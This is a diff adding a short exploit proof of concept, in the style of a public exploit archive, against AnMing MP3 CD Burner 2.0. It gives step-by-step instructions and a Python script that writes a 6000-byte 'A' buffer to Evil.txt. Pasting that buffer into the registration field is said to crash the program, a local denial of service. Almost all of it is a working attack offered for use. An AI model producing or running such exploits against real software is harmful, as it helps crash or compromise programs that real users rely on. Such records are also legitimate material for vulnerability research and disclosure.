@@ -1,0 +1,29 @@
+# Exploit Title: AnMing MP3 CD Burner 2.0 Local Dos Exploit
+# Date: 25.04.2019
+# Vendor Homepage:http://www.ddz1977.com/
+# Software Link:  https://files.downloadnow.com/s/software/10/56/16/74/anming_setup.zip?token=1556228877_063f2dc0aed064ee5d13374d8509661c&fileName=anming_setup.zip
+# Exploit Author: Achilles
+# Tested Version: 2.0
+# Tested on: Windows 7 x64 Sp1
+#            Windows XP x86 Sp3
+
+
+# 1.- Run python code :AnMing.py
+# 2.- Open EVIL.txt and copy content to clipboard
+# 3.- Open Anming.exe and Click 'Register'
+# 4.- Paste the content of EVIL.txt into the Field: 'Your Name and Registration Code'
+# 5.- Click 'OK'and you will see a crash.
+
+
+
+#!/usr/bin/env python
+buffer = "\x41" * 6000
+
+try:
+	f=open("Evil.txt","w")
+	print "[+] Creating %s bytes evil payload.." %len(buffer)
+	f.write(buffer)
+	f.close()
+	print "[+] File created!"
+except:
+	print "File cannot be created"
